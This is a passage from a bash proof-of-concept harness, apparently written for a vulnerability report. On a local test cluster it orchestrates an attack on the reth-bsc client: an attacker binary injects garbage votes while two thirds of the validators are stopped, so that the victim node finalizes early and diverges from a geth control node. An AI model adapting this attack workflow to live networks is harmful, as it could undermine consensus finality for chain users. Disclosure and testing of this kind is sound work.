      "$VICTIM_IMAGE" node --chain /genesis.json --datadir /probe-data \
      --port "$p2p" --discovery.port "$disc" --nat none \
      --http --http.addr 127.0.0.1 --http.port "$pp" --http.api eth \
      >"$OUT/probe-reth.log" 2>&1 || { echo ""; return 1; }
  fi
  h=""
  for i in $(seq 1 180); do
    h=$(rpc_raw '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["0x0",false],"id":1}' \
      "http://127.0.0.1:$pp" | jq -r '.result.hash // empty')
    [ -n "$h" ] && break
    if [ -n "$PROBE_PID" ]; then
      kill -0 "$PROBE_PID" 2>/dev/null || break
    else
      running=$(docker inspect -f '{{.State.Running}}' reth-probe 2>/dev/null)
      [ "$running" = "true" ] || break
    fi
    sleep 0.5
  done
  if [ -z "$h" ]; then
    { echo "=== reth probe FAILED: $gf (rpc=$pp p2p=$p2p disc=$disc) ==="
      echo "--- docker ps -a:"; docker ps -a --format '{{.Names}}  {{.Status}}' 2>&1 | head -n 15
      echo "--- ss -lunp (UDP):"; ss -lunp 2>/dev/null | head -n 30
      echo "--- ss -ltnp (TCP port probe):"; ss -ltnp 2>/dev/null | grep -E ":($p2p|$pp)\b" || echo "(none)"
      echo "--- probe-reth.log:"; tail -n 20 "$OUT/probe-reth.log" 2>/dev/null
      echo "--- docker logs reth-probe:"; docker logs reth-probe 2>&1 | tail -n 40
      echo "--- state:"; docker inspect -f '{{.State.Status}} exit={{.State.ExitCode}} err={{.State.Error}}' reth-probe 2>&1
    } > "$OUT/probe-reth-crash.log" 2>&1
  fi
  [ -n "$PROBE_PID" ] && kill "$PROBE_PID" 2>/dev/null
  docker rm -f reth-probe >/dev/null 2>&1
  echo "$h"
}

CAL_LOG="$OUT/genesis-calibration.log"; : > "$CAL_LOG"

# SANITY (mode ""): all Time=ft. Must MATCH — reth=? means broken probe.
SC="$WORKDIR/sanity.json"
cp "$DEPLOY_DIR/genesis/genesis.json" "$SC"
POC_SURGERY_MODE="" python3 "$DEPLOY_DIR/genesis_surgery.py" "$SC" >>"$CAL_LOG" 2>&1
SHG=$(geth_probe "$SC"); SHR=$(reth_probe "$SC"); rm -f "$SC"
printf '    %-18s geth=%s reth=%s\n' "SANITY:none" "${SHG:-?}" "${SHR:-?}" | tee -a "$CAL_LOG"
if [ -z "$SHR" ]; then
  echo "FATAL: reth probe did not answer for sanity — PROBE broken, not divergence."
  echo "  Send: $OUT/probe-reth-crash.log"; exit 1
fi
if [ "$SHG" != "$SHR" ]; then
  echo "FATAL: sanity diverge (geth=$SHG reth=$SHR) — send $CAL_LOG"; exit 1
fi
echo "    sanity OK — probe healthy (baseline: $SHG)"

# Candidate: '-plato' first (07:08 replica — predicted MATCH, plato active via platoBlock:7)
WINNER=""
for CAND in "-plato" "plato" "plato,ramanujan"; do
  CP="$WORKDIR/cand.json"
  cp "$DEPLOY_DIR/genesis/genesis.json" "$CP"
  POC_SURGERY_MODE="$CAND" python3 "$DEPLOY_DIR/genesis_surgery.py" "$CP" >>"$CAL_LOG" 2>&1 \
    || { rm -f "$CP"; printf '    %-18s surgery FAILED\n' "$CAND" | tee -a "$CAL_LOG"; continue; }
  HG=$(geth_probe "$CP"); HR=$(reth_probe "$CP"); rm -f "$CP"
  VERD="diverge"; { [ -n "$HG" ] && [ "$HG" = "$HR" ]; } && VERD="MATCH"
  printf '    %-18s geth=%s reth=%s  %s\n' "$CAND" "${HG:-?}" "${HR:-?}" "$VERD" | tee -a "$CAL_LOG"
  [ "$VERD" = "MATCH" ] && { WINNER="$CAND"; break; }
done
[ -n "$WINNER" ] || { echo "FATAL: no matching candidate — send $CAL_LOG + probe-reth-crash.log"; exit 1; }
echo "    WINNER: $WINNER"

# ---------------------------------------------------------------- [2c/9] CLUSTER ENSURE
echo "[2c/9] Cluster ensure (winner=$WINNER)..."
MARK="$DEPLOY_DIR/.cluster-ok-v9"
if [[ "$WINNER" == -* ]]; then EXPECT_PT="null"; else EXPECT_PT="0"; fi
NEED=0
[ -n "${CLUSTER_RESET:-}" ] && NEED=1
m_rpc_up || NEED=1
if [ -f "$MARK" ]; then
  read -r MW MH < "$MARK" 2>/dev/null || MW=""
  [ "$MW" = "$WINNER" ] || NEED=1
  if m_rpc_up && [ -n "${MH:-}" ]; then [ "$(m_blk0)" != "$MH" ] && NEED=1; fi
else
  NEED=1
fi
if [ "$NEED" = "1" ]; then
  echo "    reset cluster (surgery mode=$WINNER)..."
  pkill -f 'node-deploy/.local/node' 2>/dev/null || true
  pkill -f 'node-deploy/bin/geth' 2>/dev/null || true
  sleep 2
  POC_SURGERY_MODE="$WINNER" python3 "$DEPLOY_DIR/genesis_surgery.py" \
    "$DEPLOY_DIR/genesis/genesis.json" >/dev/null 2>&1 || true
  export POC_SURGERY_MODE="$WINNER"
  ( cd "$DEPLOY_DIR" && bash ./bsc_cluster.sh reset ) >"$OUT/deploy-reset.log" 2>&1 \
    || { echo "FATAL: reset failed — tail:"; tail -30 "$OUT/deploy-reset.log"; exit 1; }
  UGOK=0
  for i in $(seq 1 120); do m_rpc_up && { UGOK=1; break; }; sleep 2; done
  [ "$UGOK" = "1" ] || { echo "FATAL: cluster did not wake up — send $OUT/deploy-reset.log"; exit 1; }
  UGH=-1
  for i in $(seq 1 60); do
    UGH=$(jnum "http://127.0.0.1:8545" latest)
    [ "$UGH" -ge 8 ] 2>/dev/null && break
    sleep 2
  done
  if ! [ "$UGH" -ge 8 ] 2>/dev/null; then
    echo "FATAL: validator not mining (head=$UGH after 120s) — send $OUT/deploy-reset.log"; exit 1
  fi
  UG_DIRTY=-1; UG_DWHAT=""; UG_LIST="$(seq 1 12)"
  [ "$UGH" -gt 12 ] && UG_LIST="$UG_LIST $UGH"
  for bn in $UG_LIST; do
    bhex=$(printf '0x%x' "$bn")
    bw=$(rpc_raw "{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"$bhex\",false],\"id\":1}" \
      "http://127.0.0.1:8545" | jq -r '.result | if . == null then "" elif (.withdrawals | type) == "array" then "withdrawals" elif ((.blobGasUsed // .excessBlobGas) != null) then "blob" else "clean" end' 2>/dev/null)
    if [ -n "$bw" ] && [ "$bw" != "clean" ]; then UG_DIRTY=$bn; UG_DWHAT="$bw"; break; fi
  done
  if [ "$UG_DIRTY" -ge 0 ] 2>/dev/null; then
    echo "FATAL: post-merge field ($UG_DWHAT) appears starting block $UG_DIRTY — mid-chain transition still active."
    echo "  Source: block-fork (check surgery block8group) or --override time (check flag value)."
    echo "  Send: ps -eo args | grep -F config.toml | grep -v grep  +  jq -c '.config' $DEPLOY_DIR/genesis/genesis.json"
    exit 1
  fi
  echo "    validator: mining OK (head=$UGH), blocks 1..12 PRE-FT (clean) — without mid-chain transition"
  MH=$(m_blk0)
  PT=$(jq -r '.config.platoTime // "null"' "$DEPLOY_DIR/genesis/genesis.json")
  HG2=$(geth_probe "$DEPLOY_DIR/genesis/genesis.json")
  if [ "$PT" != "$EXPECT_PT" ] || [ "$HG2" != "$MH" ]; then
    echo "FATAL: surgery inconsistent with chain (platoTime=$PT expect=$EXPECT_PT tpl=$HG2 chain=$MH)."
    echo "  Send: grep -n 'patch_genesis_for_reth\|prepare_config\|init' $DEPLOY_DIR/bsc_cluster.sh | head -30"
    exit 1
  fi
  printf '%s %s\n' "$WINNER" "$MH" > "$MARK"
  echo "    cluster OK: genesis=$MH head=$UGH platoTime=$PT (winner=$WINNER)"
else
  echo "    cluster matches (marker: $(cat "$MARK")) — skip reset"
fi
# v9: flag --override.<forktime> ALWAYS present (start_node sets it);
# what's checked is its VALUE — must not be <= now.
UG_NOW=$(date +%s)
UG_PAST=$(ps -eo args 2>/dev/null | grep -F 'config.toml' | grep -v grep \
  | grep -oE -- '--override\.(passedforktime|lorentz|maxwell|fermi|osaka|mendel|pasteur) [0-9]+' \
  | awk -v now="$UG_NOW" '$2 <= now {print}' | head -n 3)
if [ -n "$UG_PAST" ]; then
  echo "FATAL: past --override fork-time still active:"; echo "$UG_PAST"
  echo "  (sed hardforkTime +7200 not applied?) — send: ps -eo args | grep -F config.toml | grep -v grep"
  exit 1
fi
echo "    flag check OK — all --override fork-time future"

GENESIS_JSON="$DEPLOY_DIR/genesis/genesis.json"
echo "    PIN victim genesis: $GENESIS_JSON"

# ---------------------------------------------------------------- [3/9] adaptive discovery
echo "[3/9] Discovery: genesis + validator enode + quorum..."
collect_enodes() {
  # (1) StaticNodes config.toml — nodekey fix in keys/ => stable enode across resets
  local found
  found=$(grep -rhoE "enode://[0-9a-f]{128}@[0-9.]+:[0-9]+" \
    "$DEPLOY_DIR"/.local/node*/config.toml 2>/dev/null | sort -u)
  [ -n "$found" ] && { echo "$found"; return 0; }
  # (2) fallback: RPC admin_nodeInfo (live validators)
  local p e
  for p in 8545 8547 8549; do
    e=$(curl -s -m 2 -X POST -H 'Content-Type: application/json' \
      --data '{"jsonrpc":"2.0","method":"admin_nodeInfo","params":[],"id":1}' \
      "http://127.0.0.1:$p" 2>/dev/null | jq -r '.result.enode // empty' 2>/dev/null)
    [ -n "$e" ] && echo "$e"
  done | sort -u
}
GENESIS_JSON="${GENESIS_JSON:-}"
ENODES=()
for i in $(seq 1 120); do
  if [ -z "$GENESIS_JSON" ]; then
    GENESIS_JSON=$(find "$DEPLOY_DIR" -maxdepth 6 -name 'genesis.json' -not -path '*node_modules*' -not -path '*.git*' 2>/dev/null \
      | python3 -c "
import sys
fs=[l.strip() for l in sys.stdin if l.strip()]
fs.sort(key=lambda p: __import__('os.path').path.getmtime(p), reverse=True)
print(fs[0] if fs else '')" 2>/dev/null || true)
  fi
  mapfile -t ENODES < <(collect_enodes)
  echo "    [discovery ${i}] genesis=${GENESIS_JSON:+OK} enodes=${#ENODES[@]}"
  [ -n "$GENESIS_JSON" ] && { [ "${#ENODES[@]}" -ge 1 ] || [ -n "${VALIDATOR_ENODE:-}" ]; } && break
  sleep 5
done
[ -n "$GENESIS_JSON" ] && [ -f "$GENESIS_JSON" ] \
  || { echo "FATAL: genesis.json not found. Set GENESIS_JSON=/path manually."; exit 1; }
if [ "${#ENODES[@]}" -eq 0 ]; then
  if [ -n "${VALIDATOR_ENODE:-}" ]; then
    ENODES=("$VALIDATOR_ENODE")
  else
    echo "FATAL: validator enode not found. Set VALIDATOR_ENODE=enode://...@127.0.0.1:<port> manually."; exit 1
  fi
fi
N=${#ENODES[@]}
if [ -z "${QUORUM:-}" ]; then
  QUORUM=$(python3 -c "import math;print(math.ceil(2*$N/3))")
fi
echo "    genesis : $GENESIS_JSON"
echo "    enode[0]: ${ENODES[0]%%\?*}"
echo "    validator(N)=$N -> QUORUM=$QUORUM"

VICTIM_RPC_PORT="${VICTIM_RPC_PORT:-}"
if [ -z "$VICTIM_RPC_PORT" ]; then
  for p in 8546 8548 8550 8600 8601 8602; do
    if ! port_busy "$p"; then VICTIM_RPC_PORT=$p; break; fi
  done
fi
[ -n "$VICTIM_RPC_PORT" ] || { echo "FATAL: no free RPC port"; exit 1; }
VICTIM_RPC="http://127.0.0.1:$VICTIM_RPC_PORT"
echo "    victim RPC: $VICTIM_RPC (victim p2p 30403, attacker p2p $ATTACK_PORT)"

TRUSTED=()
for e in "${ENODES[@]}"; do TRUSTED+=(--trusted-peers "$e"); done
RUST_LOG_VAL="info,net=debug,net::eth-wire=debug,net::session=debug,bsc_protocol=debug,bsc::vote_pool=trace,bsc::block_import=debug,bsc::registry=debug"

# ---------------------------------------------------------------- [4/9] victim start
echo "[4/9] Start VICTIM (reth-bsc)..."
stop_victim
rm -rf "$VICTIM_DATA"
if [ -n "$RETH_BIN" ]; then
  echo "    mode host-binary: $RETH_BIN"
  RUST_LOG="$RUST_LOG_VAL" nohup "$RETH_BIN" node \
    --chain "$GENESIS_JSON" --datadir "$VICTIM_DATA" \
    --port 30403 --discovery.port 30404 --nat none \
    --http --http.addr 127.0.0.1 --http.port "$VICTIM_RPC_PORT" \
    --http.api eth,net,web3,admin \
    "${TRUSTED[@]}" >"$OUT/victim.log" 2>&1 &
  VICTIM_PID=$!
else
  echo "    mode docker (build official reth-bsc Dockerfile; 20-60 minutes first time)..."
  # Keep build context small (poc-attack contains chaindata + bsc clone hundreds of MB)
  if ! grep -q "^poc-attack" "$RETH_SRC/.dockerignore" 2>/dev/null; then
    printf '\n# --- poc.sh: keep build context small ---\npoc-attack\ntarget\n.git\ndist\ndiag\n' >> "$RETH_SRC/.dockerignore"
  fi
  docker build -t "$VICTIM_IMAGE" \
    --build-arg BUILD_PROFILE=release \
    --build-arg FEATURES="${RETH_FEATURES:-jemalloc,asm-keccak}" \
    "$RETH_SRC" >"$OUT/victim-build.log" 2>&1 \
    || { echo "FATAL: victim docker build failed — see $OUT/victim-build.log"; exit 1; }
  docker rm -f "$VICTIM_CTR" >/dev/null 2>&1
  docker run -d --name "$VICTIM_CTR" --network host \
    -v "$GENESIS_JSON":/genesis.json:ro \
    -e RUST_LOG="$RUST_LOG_VAL" \
    "$VICTIM_IMAGE" node \
      --chain /genesis.json --datadir /data \
      --port 30403 --discovery.port 30404 --nat none \
      --http --http.addr 0.0.0.0 --http.port "$VICTIM_RPC_PORT" \
      --http.api eth,net,web3,admin \
      "${TRUSTED[@]}" >/dev/null \
    || { echo "FATAL: run victim failed — docker logs $VICTIM_CTR"; exit 1; }
fi

# ---------------------------------------------------------------- [5/9] sync checkpoint
# ---- [4b/9] genesis hash fast-fail ----
GH1=""
for i in $(seq 1 30); do
  GH1=$(rpc_raw '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["0x0",false],"id":1}' "$VICTIM_RPC" | jq -r '.result.hash // empty')
  [ -n "$GH1" ] && break; sleep 2
done
GH2=$(rpc_raw '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["0x0",false],"id":1}' "http://127.0.0.1:8545" | jq -r '.result.hash // empty')
if [ -n "$GH1" ] && [ -n "$GH2" ] && [ "$GH1" != "$GH2" ]; then
  echo "FATAL: genesis mismatch victim=$GH1 miner=$GH2 — genesis changed without reset."
  echo "  Run ./poc.sh again (phase [2b] auto re-converges).
  Repeated? send audit-out/genesis-calibration.log + deploy-reset.log + jq -c '.config' poc-attack/node-deploy/genesis/genesis.json"
  exit 1
fi
echo "    genesis hash match: $GH1"
echo "[5/9] CHECKPOINT: wait for victim to sync from validator cluster..."
V=0
for i in $(seq 1 240); do
  V=$(jnum "$VICTIM_RPC" latest)
  [ "$V" -ge 3 ] 2>/dev/null && break
  if [ -n "$VICTIM_PID" ] && ! kill -0 "$VICTIM_PID" 2>/dev/null; then
    echo "FATAL: victim process died — tail $OUT/victim.log:"; tail -20 "$OUT/victim.log"; exit 1
  fi
  sleep 2
done
[ "$V" -ge 3 ] 2>/dev/null || {
  echo "FATAL: victim not synced (block=$V)."
  echo "--- victim log:"
  if [ -n "$VICTIM_PID" ] && [ -f "$OUT/victim.log" ]; then tail -40 "$OUT/victim.log"
  else docker logs "$VICTIM_CTR" 2>&1 | tail -40; fi
  echo "--- net_peerCount:"
  rpc_raw '{"jsonrpc":"2.0","method":"net_peerCount","params":[],"id":1}' "$VICTIM_RPC"; echo
  echo "--- validator(8545) head/peers/post-merge:"
  rpc_raw '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}' "http://127.0.0.1:8545"; echo
  rpc_raw '{"jsonrpc":"2.0","method":"net_peerCount","params":[],"id":1}' "http://127.0.0.1:8545"; echo
  rpc_raw '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["latest",false],"id":1}' "http://127.0.0.1:8545" \
    | jq -r '.result | if (.withdrawals | type) == "array" then "post-merge ACTIVE (fork-ID divergent!)" else "clean" end' 2>/dev/null
  echo "--- victim log (disconnect/status/forkid):"
  if [ -n "$VICTIM_PID" ] && [ -f "$OUT/victim.log" ]; then
    grep -iE 'disconnect|fork.?id|useless|banned|removing|status' "$OUT/victim.log" | tail -30
  else
    docker logs "$VICTIM_CTR" 2>&1 | grep -iE 'disconnect|fork.?id|useless|banned|removing|status' | tail -30
  fi
  echo "--- genesis hash victim vs miner(8545):"
  rpc_raw '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["0x0",false],"id":1}' "$VICTIM_RPC" | jq -r '.result.hash // "null"'
  rpc_raw '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["0x0",false],"id":1}' "http://127.0.0.1:8545" | jq -r '.result.hash // "null"'
  exit 1
}
echo "    victim at block $V"

# ---------------------------------------------------------------- [6/9] CHECKPOINT-1: organic finality
echo "[6/9] CHECKPOINT-1: verify organic finality moves (normal flow)..."
F_PRE=$(jnum "$VICTIM_RPC" finalized)
F_POST=$F_PRE
for i in $(seq 1 300); do
  F_POST=$(jnum "$VICTIM_RPC" finalized)
  [ "$F_POST" -gt "$F_PRE" ] 2>/dev/null && break
  sleep 1
done
echo "{\"phase\":\"checkpoint1\",\"finalized_before\":$F_PRE,\"finalized_after\":$F_POST,\"validators\":$N,\"quorum\":$QUORUM,\"genesis\":\"$GENESIS_JSON\"}" | tee "$OUT/checkpoint1.json"
if [ "$F_POST" -gt "$F_PRE" ] 2>/dev/null; then
  echo "    CHECKPOINT-1 OK (finalized $F_PRE -> $F_POST)"
else
  echo "    !! CHECKPOINT-1 FAILED within 300s — window might be closed (setup limitation). Run continues for honest transcript."
fi

# ---------------------------------------------------------------- [7/9] BEFORE
ATST=$(rpc_raw '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["latest",false],"id":1}' \
  "http://127.0.0.1:8545" | python3 -c "
import sys,json
try:
    r=json.load(sys.stdin).get('result') or {}
    e=r.get('extraData','')
    print((len(e)-2)//2)
except Exception:
    print(-1)" 2>/dev/null || echo -1)
echo "    attestation: validator latest block extraData = ${ATST}B (>~250 = attestation present; <160 = validator without vote-keys)"

echo "[7/9] BEFORE snapshot:"
for i in 1 2 3; do
  rpc_raw '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["finalized",false],"id":1}' "$VICTIM_RPC" | tee -a "$OUT/before-finalized.jsonl"; echo
  sleep 2
done

# ---------------------------------------------------------------- [8/9] OUTAGE ORCHESTRATION
# Realistic scenario (has happened on BSC): 2/3 validators down -> quorum
# lost organically -> entire geth network freezes finality. Victim reth
# still advances finalized from attacker's garbage votes -> DIVERGENCE vs
# geth control node. This is the only forge window: the FIRST solo block post-outage
# (pre-death attestation raises justified to head-1; organic votes for
# new head = 1 < quorum; garbage completes the count).
echo "[8/9] Outage orchestration: control fullnode (geth) + attacker + stop 2/3 validators..."
TL="$OUT/outage-timeline.log"; : > "$TL"

echo "    [8a] start geth control node (bsc_fullnode.sh reset 0 full)..."
( cd "$DEPLOY_DIR" && bash ./bsc_fullnode.sh reset 0 full ) >"$OUT/fullnode.log" 2>&1 \
  || { echo "FATAL: bsc_fullnode.sh reset failed — tail $OUT/fullnode.log:"; tail -10 "$OUT/fullnode.log"; exit 1; }
# reset might only init — ensure process is alive (restart = stop+start)
sleep 3
if ! pgrep -f 'fullnode/node0' >/dev/null 2>&1; then
  echo "    reset left no process — running 'restart 0 full'..."
  ( cd "$DEPLOY_DIR" && bash ./bsc_fullnode.sh restart 0 full ) >>"$OUT/fullnode.log" 2>&1 || true
fi
# RPC port from process cmdline (flag --http.port); fallback local config
CRPC=""
for i in $(seq 1 90); do
  FP=$(pgrep -f 'fullnode/node0' | head -n1)
  if [ -n "$FP" ]; then
    FPT=$(tr '\0' ' ' < "/proc/$FP/cmdline" 2>/dev/null | grep -oE '\-\-http\.port [0-9]+' | awk '{print $2}' | head -n1)
    if [ -z "$FPT" ]; then
      FPT=$(grep -hoE '^HTTPPort *= *[0-9]+' "$DEPLOY_DIR"/.local/fullnode/node0/config.toml 2>/dev/null | grep -oE '[0-9]+' | head -n1)
    fi
    if [ -n "$FPT" ] && curl -s -m 2 -X POST -H 'Content-Type: application/json' \
      --data '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}' \
      "http://127.0.0.1:$FPT" 2>/dev/null | grep -q '"result"'; then
      CRPC="http://127.0.0.1:$FPT"; break
    fi
  fi
  sleep 2
done
[ -n "$CRPC" ] || {
  echo "FATAL: control fullnode RPC not found."
  echo "--- fullnode process:"; pgrep -af fullnode || echo "(none)"
  echo "--- contents of .local/fullnode/node0:"; ls "$DEPLOY_DIR/.local/fullnode/node0/" 2>/dev/null
  echo "--- runtime log (bsc-node.log tail):"
  tail -30 "$DEPLOY_DIR/.local/fullnode/node0/bsc-node.log" 2>/dev/null || echo "(none)"
  echo "--- fullnode.log tail:"; tail -10 "$OUT/fullnode.log"
  exit 1
}
echo "    control RPC: $CRPC"
echo "    wait for control to sync to victim head..."
SYNCED=0; CV=-1; VV=-1
for i in $(seq 1 180); do
  CV=$(jnum "$CRPC" latest); VV=$(jnum "$VICTIM_RPC" latest)
  if [ "$CV" -ge "$VV" ] 2>/dev/null && [ "$VV" -ge 3 ] 2>/dev/null; then SYNCED=1; break; fi
  sleep 2
done
[ "$SYNCED" = "1" ] || { echo "FATAL: control not synced (head=$CV vs victim=$VV)"; exit 1; }
echo "    control synced (head=$CV)"

# [8b] baseline finality parity (both nodes healthy, both organic)
BF_V=$(jnum "$VICTIM_RPC" finalized); BF_C=$(jnum "$CRPC" finalized)
for i in $(seq 1 60); do
  [ "$BF_V" = "$BF_C" ] && [ "$BF_V" -gt 0 ] 2>/dev/null && break
  sleep 2; BF_V=$(jnum "$VICTIM_RPC" finalized); BF_C=$(jnum "$CRPC" finalized)
done
echo "    [8b] baseline: victim_finalized=$BF_V control_finalized=$BF_C head=$VV"

# [8c] attacker in background — inject per new head, continuously
echo "    [8c] attacker background (inject per head; sync-dump per reconnect = proof of ingestion+propagation)..."
ALOG="$OUT/attack-transcript.log"; : > "$ALOG"
VICTIM_RPC="$VICTIM_RPC" ADVERTISE_IP=127.0.0.1 LISTEN_PORT="$ATTACK_PORT" \
QUORUM="$QUORUM" OBSERVE_HEADS="${OBSERVE_HEADS:-2}" CONTROL_HEADS="${CONTROL_HEADS:-1}" \
ATTACK_HEADS=100000 PERSIST_HEADS=1 \
timeout 900 "$ATTACKER_BIN" >"$ALOG" 2>&1 &
APID=$!
FASE3=0
for i in $(seq 1 240); do
  grep -q 'PHASE 3' "$ALOG" && { FASE3=1; break; }
  kill -0 "$APID" 2>/dev/null || break
  sleep 1
done
if [ "$FASE3" != "1" ]; then
  echo "FATAL: attacker did not reach PHASE 3 — tail $ALOG:"; tail -20 "$ALOG"
  kill "$APID" 2>/dev/null; exit 1
fi
echo "    PHASE 3 active — attacker injecting per new head"

# [8d] OUTAGE: stop 2/3 validators; monitor divergence per second
echo "    [8d] OUTAGE: stop validator idx1 & idx2 (node0 solo)..."
echo "=== OUTAGE START $(date) ===" >> "$TL"
( cd "$DEPLOY_DIR" && bash ./bsc_cluster.sh stop 1 >/dev/null 2>&1 || true; \
                    bash ./bsc_cluster.sh stop 2 >/dev/null 2>&1 || true )
DIV=0; MAXD=0; DIV_AT=""; AFTER=0; VH=-1
for i in $(seq 1 180); do
  VH=$(jnum "$VICTIM_RPC" latest); VF=$(jnum "$VICTIM_RPC" finalized)
  CH=$(jnum "$CRPC" latest);     CF=$(jnum "$CRPC" finalized)
  D=0
  if [ "$VF" -ge 0 ] 2>/dev/null && [ "$CF" -ge 0 ] 2>/dev/null; then D=$((VF - CF)); fi
  printf '%s head_v=%s fin_v=%s head_c=%s fin_c=%s delta=%s\n' "$(date +%H:%M:%S)" "$VH" "$VF" "$CH" "$CF" "$D" >> "$TL"
  if [ "$D" -gt 0 ] 2>/dev/null; then
    if [ "$DIV" = "0" ]; then
      DIV=1; DIV_AT="$(date +%H:%M:%S)"
      VFH=$(rpc_raw '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["finalized",false],"id":1}' "$VICTIM_RPC" | jq -r '.result.hash // "?"')
      CFH=$(rpc_raw '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["finalized",false],"id":1}' "$CRPC" | jq -r '.result.hash // "?"')
      echo "    >>> FIRST DIVERGENCE: victim=$VF ($VFH) vs control=$CF ($CFH) <<<" | tee -a "$TL"
    fi
    [ "$D" -gt "$MAXD" ] && MAXD=$D
    AFTER=$((AFTER + 1))
    [ "$AFTER" -ge 30 ] && break
  fi
  sleep 1
done
echo "=== OUTAGE END (monitor) $(date) ===" >> "$TL"

# [8e] recovery + post-outage sample
echo "    [8e] recovery: start all validators..."
( cd "$DEPLOY_DIR" && bash ./bsc_cluster.sh start >/dev/null 2>&1 || true )
for i in $(seq 1 90); do
  m_rpc_up && { VH2=$(jnum "$VICTIM_RPC" latest); [ "$VH2" -gt "$VH" ] 2>/dev/null && break; }
  sleep 2
done
sleep 25
PF_V=$(jnum "$VICTIM_RPC" finalized); PF_C=$(jnum "$CRPC" finalized)
kill "$APID" 2>/dev/null; wait "$APID" 2>/dev/null
HITS=$(grep -o 'attacker_hits=[0-9]*' "$ALOG" | tail -1 | grep -oE '[0-9]+' || echo 0)

ARC=3
if [ "$DIV" = "1" ]; then
  ARC=0
  echo ">>> PREMATURE FINALITY VIA GARBAGE VOTES: victim divergent from network (max_delta=$MAXD, first=$DIV_AT) <<<"
fi
echo "{\"baseline\":{\"victim\":$BF_V,\"control\":$BF_C},\"outage\":{\"max_delta\":$MAXD,\"divergence_first\":\"$DIV_AT\"},\"post_recovery\":{\"victim\":$PF_V,\"control\":$PF_C},\"attacker_hits_last\":${HITS:-0}}" \
  | tee "$OUT/outage-result.json"

# ---------------------------------------------------------------- [9/9] AFTER + summary
echo "[9/9] AFTER snapshot:"
rpc_raw '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["finalized",false],"id":1}' "$VICTIM_RPC" | tee -a "$OUT/after-finalized.jsonl"; echo
if [ -n "$VICTIM_PID" ]; then
  cp "$OUT/victim.log" "$OUT/victim-final.log"
else
  docker logs "$VICTIM_CTR" > "$OUT/victim-final.log" 2>&1
fi

echo "===================================================================="
if [ "$ARC" = "0" ]; then
  echo "RESULT: PREMATURE FINALITY FORGED + DIVERGENCE vs NETWORK (exit=0)."
  echo "Proof  : $OUT/outage-timeline.log  — delta>0 during outage (victim vs geth control)"
  echo "         $OUT/attack-transcript.log — injection per head + sync-dump attacker_hits=${HITS:-0}"
  echo "         $OUT/outage-result.json"
else
  echo "RESULT: divergence not observed (exit=3). Sequential diagnosis:"
  echo "  1) tail $TL: head_v STUCK while head_c advances -> victim rejects solo wiggle block;"
  echo "     confirmation: grep -c 'backoff period' $OUT/victim-final.log"
  echo "  2) fin_v == fin_c from the start -> gate window (justified==head-1) not open;"
  echo "     check solo block attestation: eth_getBlockByNumber head_c via $CRPC (extraData length)"
  echo "  3) attacker_hits=0 -> bsc/2 session inactive (grep ESTABLISHED $ALOG)"
fi
echo "Artifacts : $OUT/"
echo "Teardown: ./poc.sh clean"
echo "===================================================================="
exit "$ARC"
}
